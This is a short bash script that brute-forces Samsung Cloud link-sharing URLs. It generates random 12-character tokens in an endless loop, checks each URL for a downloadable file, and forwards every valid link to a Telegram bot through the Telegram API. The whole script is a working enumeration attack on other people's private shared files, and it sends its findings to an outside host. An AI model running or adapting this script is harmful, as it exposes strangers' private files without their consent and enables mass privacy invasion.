function bot(){
source config.sh
curl -s --data chat_id=$chat_id --data-urlencode text="$text https://linksharing.samsungcloud.com/$1" "https://api.telegram.org/bot$token/sendMessage" > /dev/null
}

function hash(){ #Generate HASH algo used by the samsung share URL
string=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 12)
echo $string
}


while(true);do
HASH=$(hash)
curl -s https://linksharing.samsungcloud.com/$HASH| grep "downloadOption" > /dev/null
 if [[ $? == 0 ]];then
  bot $HASH
 fi
done
